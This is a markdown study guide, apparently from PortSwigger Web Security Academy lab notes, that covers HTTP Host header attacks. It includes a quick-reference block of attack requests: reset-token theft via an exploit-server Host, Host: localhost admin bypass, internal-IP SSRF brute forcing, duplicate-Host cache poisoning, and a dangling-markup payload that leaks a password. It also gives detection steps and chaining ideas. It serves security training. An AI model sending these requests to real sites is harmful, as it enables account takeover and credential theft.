# HTTP Host header attacks — topic overview & router

The Host header tells the server which virtual host to serve and is used to generate absolute URLs (password reset links, redirects, JS imports). When servers trust it without validation, attackers can poison reset emails, bypass IP-based access controls, pivot into internal networks via the routing infrastructure, or serve cached malicious responses to all users.

## 30-second quick reference

```
# Password reset poisoning (token in email URL)
POST /forgot-password
Host: EXPLOIT-SERVER-DOMAIN
username=carlos
→ access log contains /forgot-password?temp-forgot-password-token=CARLOS-TOKEN

# Admin bypass (IP check replaced by Host check)
GET /admin
Host: localhost
→ 200 OK, admin panel accessible

# Routing-based SSRF (Host forwarded to load balancer)
Host: 192.168.0.§1§   (Intruder 0-255)
→ 302 to /admin when internal IP found

# Absolute URL SSRF (flawed request parsing)
GET https://LAB-ID.web-security-academy.net/
Host: 192.168.0.§1§

# Connection state bypass (keepalive reuse)
Request 1: GET /  Host: LAB-ID  Connection: keep-alive
Request 2: GET /admin  Host: 192.168.0.1
→ Send group in sequence (single connection) — request 2 validated against request 1's host

# Cache poisoning via duplicate Host header
GET /?cb=123
Host: LAB-ID.web-security-academy.net
Host: EXPLOIT-SERVER-ID.exploit-server.net
→ second Host reflected in tracking.js import URL → poison cache

# Dangling markup (new password in email body)
Host: LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
→ rest of email (new password) becomes URL query → leaks to access log
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| Password reset link contains domain from Host header | [Password-reset-poisoning](Password-reset-poisoning/) | change Host to exploit server, steal token from access log |
| Admin panel checks "local user" by Host or IP | [Advanced-and-connection-state](Advanced-and-connection-state/) | Host: localhost bypass |
| Host forwarded to routing/load-balancer | [SSRF-and-routing-based](SSRF-and-routing-based/) | brute internal IPs via Host, reach /admin |
| Request validation uses absolute URL, not Host | [SSRF-and-routing-based](SSRF-and-routing-based/) | GET absolute URL + arbitrary Host → SSRF |
| Keepalive connection, first-request Host validated | [Advanced-and-connection-state](Advanced-and-connection-state/) | send group in sequence, second req uses internal IP Host |
| Host value reflected in JS import, response cached | [Advanced-and-connection-state](Advanced-and-connection-state/) | duplicate Host header, exploit server reflected, cache poisoned |
| Password reset sends new password in email body | [Password-reset-poisoning](Password-reset-poisoning/) | dangling markup via injected port in Host |

## Sub-technique folders

- `Password-reset-poisoning/` — Labs 1, 7: token theft and dangling-markup (2 labs)
- `SSRF-and-routing-based/` — Labs 4, 5: routing-based SSRF, flawed request parsing (2 labs)
- `Advanced-and-connection-state/` — Labs 2, 3, 6: admin bypass, cache poisoning, connection state (3 labs)

## Root cause

- Servers use the Host header to build links, redirect URLs, and route requests — trusting attacker-controlled input.
- Access controls based on Host ("localhost" = admin) trivially bypassed.
- Load balancers and reverse proxies forward the Host to the back-end without stripping attacker-injected values.
- HTTP/1.1 keepalive connections share TCP sessions; some servers validate the host only on the first request.

## Find it

1. Test every request: substitute an arbitrary domain in Host → does the app still respond?
2. For password resets: capture the reset email and check whether the Host value appears in the reset URL.
3. For admin panels: check the error message — "local users only" → try Host: localhost or Host: 127.0.0.1.
4. Send Host: COLLABORATOR-DOMAIN on any request → Collaborator receives HTTP interaction → routing SSRF.
5. Add a second Host header → does either value appear in the response? → cache poisoning candidate.
6. Try absolute URL in request line with modified Host — does app stop blocking?

## Chaining

- Password reset poisoning → account takeover → [Authentication](../Authentication/)
- Routing SSRF → internal admin panel → [Access-control](../Access-control/)
- Cache poisoning via Host → XSS served to all users → [XSS](../XSS/)
- Dangling markup → credential leak → authentication bypass

## Tools

- **Burp Repeater** — manual Host header manipulation
- **Burp Intruder** — brute-force internal IP range via Host header (0-255 on last octet)
- **Burp Collaborator** — confirm out-of-band SSRF via Host header
- **Burp "Send group in sequence (single connection)"** — connection state attacks

## References

- https://portswigger.net/web-security/host-header
- https://portswigger.net/web-security/host-header/exploiting
